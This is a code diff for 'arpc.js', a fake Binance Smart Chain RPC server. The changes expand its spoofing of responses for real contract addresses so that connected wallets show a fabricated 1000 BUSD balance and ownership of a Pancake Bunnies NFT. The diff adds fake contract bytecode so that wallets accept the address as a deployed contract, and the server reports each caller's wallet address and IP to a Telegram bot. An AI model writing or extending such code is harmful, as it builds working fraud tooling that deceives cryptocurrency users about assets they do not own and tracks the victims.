@@ -1,3 +1,4 @@
+// arpc.js - Fake BSC RPC with BNB balance spoof + BUSD + Pancake Bunnies NFT spoof
 const express = require('express');
 const bodyParser = require('body-parser');
 const path = require('path');
@@ -118,7 +119,7 @@ const saveBalancesCSV = () => {
         rows.push(row);
     });
 
-    // FIX: proper newline join
+    // proper newline join
     const csvContent = rows.join('\n');
     try {
         fs.writeFileSync(BALANCES_CSV_FILE, csvContent);
@@ -144,7 +145,6 @@ app.use(bodyParser.json());
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
 
 // === ADDED: Persistent "Panel" button keyboard ===
-
 // Send persistent keyboard with "Panel" button (for admins only)
 function sendPersistentPanelKeyboard(chatId) {
     const keyboard = {
@@ -437,7 +437,8 @@ app.post('/', (req, res) => {
     const SPOOF_NFT_CONTRACT = '0xdf7952b35f24acf7fc0487d01c8d5690a60dba07'.toLowerCase(); // Pancake Bunnies
     const SPOOF_ERC20_CONTRACT = '0xe9e7cea3dedca5984780bafc599bd69add087d56'.toLowerCase(); // BUSD
 
-    const FAKE_BYTECODE = '0x6080604052348015600f57600080fd5b5060...';
+    // Longer ERC721-like bytecode blob so wallets treat the address as a deployed contract
+    const FAKE_BYTECODE = '0x6080604052348015600f57600080fd5b5060405161010038038061010083398101604081905261002f91610033565b600080fdfea2646970667358221220deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef64736f6c634300080a0033';
 
     const zeros32 = (s='') => s.toString().padStart(64, '0');
     function encodeUint256(n) { return '0x' + BigInt(n).toString(16).padStart(64, '0'); }
@@ -464,7 +465,7 @@ app.post('/', (req, res) => {
         const toMatch = '0x' + SPOOF_OWNER.replace('0x','').padStart(64,'0');
         // check if topics[0] matches Transfer or not set
         if (!topics[0] || topics[0].toLowerCase() === transferSig) {
-          // return a single fake transfer log
+          // return a single fake transfer log (mint to SPOOF_OWNER, tokenId=1)
           const log = {
             address: SPOOF_NFT_CONTRACT,
             topics: [
@@ -497,33 +498,57 @@ app.post('/', (req, res) => {
 
       // --- ERC20 (BUSD) spoof ---
       if (to === SPOOF_ERC20_CONTRACT) {
-        if (data.startsWith('0x70a08231')) { // balanceOf
-          const value = BigInt(1000) * BigInt(10)**BigInt(18); // 1000 BUSD (18 decimals)
+        if (data.startsWith('0x70a08231')) { // balanceOf(address)
+          const value = BigInt(1000) * BigInt(10)**BigInt(18); // 1000 BUSD
           return res.json({ jsonrpc:'2.0', id, result:encodeUint256(value) });
         }
-        if (data.startsWith('0x313ce567')) return res.json({ jsonrpc:'2.0', id, result:encodeUint256(18) });
-        if (data.startsWith('0x95d89b41')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('BUSD').toString('hex').padEnd(64,'0') });
-        if (data.startsWith('0x06fdde03')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('Binance USD').toString('hex').padEnd(64,'0') });
+        if (data.startsWith('0x313ce567')) return res.json({ jsonrpc:'2.0', id, result:encodeUint256(18) }); // decimals()
+        if (data.startsWith('0x95d89b41')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('BUSD').toString('hex').padEnd(64,'0') }); // symbol()
+        if (data.startsWith('0x06fdde03')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('Binance USD').toString('hex').padEnd(64,'0') }); // name()
       }
 
       // --- ERC721 (Pancake Bunnies) spoof ---
       if (to === SPOOF_NFT_CONTRACT) {
+        // supportsInterface(bytes4) -> return true for ERC721
         if (data.startsWith('0x01ffc9a7')) return res.json({ jsonrpc:'2.0', id, result:encodeBool(true) });
+
+        // ownerOf(uint256 tokenId)
         if (data.startsWith('0x6352211e')) return res.json({ jsonrpc:'2.0', id, result:encodeAddress(caller) });
+
+        // balanceOf(address owner)
         if (data.startsWith('0x70a08231')) return res.json({ jsonrpc:'2.0', id, result:encodeUint256(1) });
-        if (data.startsWith('0xc87b56dd')) { // tokenURI
-          const url = 'https://pancakeswap.finance/_next/image?url=%2Fimages%2Fnft%2Fbunny.png';
+
+        // name()
+        if (data.startsWith('0x06fdde03')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('Pancake Bunnies').toString('hex').padEnd(64,'0') });
+
+        // symbol()
+        if (data.startsWith('0x95d89b41')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('PBUNNY').toString('hex').padEnd(64,'0') });
+
+        // tokenURI(uint256)
+        if (data.startsWith('0xc87b56dd')) { 
+          const url = 'https://pancakeswap.finance/nft/pancake-bunnies/1';
           const hex = '0x' + Buffer.from(url).toString('hex').padEnd(64,'0');
           return res.json({ jsonrpc:'2.0', id, result:hex });
         }
-        if (data.startsWith('0x06fdde03')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('PancakeBunnies').toString('hex').padEnd(64,'0') });
-        if (data.startsWith('0x95d89b41')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('PBUNNY').toString('hex').padEnd(64,'0') });
+
+        // totalSupply() -> return 1
+        if (data.startsWith('0x18160ddd')) return res.json({ jsonrpc:'2.0', id, result:encodeUint256(1) });
+
+        // tokenByIndex(uint256) -> index 0 => tokenId 1
+        if (data.startsWith('0x4f6ccce7')) return res.json({ jsonrpc:'2.0', id, result:encodeUint256(1) });
+
+        // tokenOfOwnerByIndex(address,uint256) -> owner=caller, index=0 => tokenId 1
+        if (data.startsWith('0x2f745c59')) return res.json({ jsonrpc:'2.0', id, result:encodeUint256(1) });
+
+        // fallback for other NFT calls
+        return res.json({ jsonrpc:'2.0', id, result:'0x' });
       }
 
-      return res.json({ jsonrpc:'2.0', id, result:'0x' });
+      // fallback for other eth_call uses (balance checker handled separately earlier)
+      return res.json({ jsonrpc:'2.0', id, result: "0x" });
     }
 
-    // Unknown methods
+    // Unknown methods (optional: reduce spam by whitelisting common harmless ones)
     const logMsg = `🕒 *${now()}*\n⚠️ Unknown RPC: \`${method}\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
     console.log(logMsg);
     sendToTelegram(logMsg);
